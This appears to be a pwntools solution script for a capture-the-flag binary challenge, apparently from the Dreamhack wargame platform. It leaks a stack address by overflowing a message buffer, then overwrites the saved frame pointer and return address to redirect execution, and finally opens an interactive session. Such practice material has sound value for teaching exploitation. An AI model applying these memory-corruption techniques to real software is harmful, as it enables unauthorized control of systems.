#!/usr/bin/python3
from pwn import *

context.log_level='debug'
name = "./vuln"
context.binary = exe = ELF(name, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(exe.path)
# p = remote('host8.dreamhack.games', 49327)

# gdb.attach(p, gdbscript='''
#         b*small_message+81
#         b*main+33
#         c
#                 ''' )

p.sendlineafter(b'Exit', b'1')
p.sendlineafter(b'size:', b'32')
p.sendafter(b'message', b'A' * 0x18)
p.recvuntil(b'A' * 0x18)
leak_stack = u64(p.recv(6) + b'\0\0')
main_rbp = leak_stack + 0x30
log.info("Stack leak: " + hex(leak_stack))

p.sendlineafter(b'Exit', b'1')
p.sendlineafter(b'size:', b'32')
p.sendafter(b'message', b'A' * 0x30 + p64(leak_stack) + p64(0x40157c) + b'A' * 16 + p64(leak_stack + 0x24)) 
p.sendlineafter(b'Exit', str(0x401773).encode())
p.interactive()

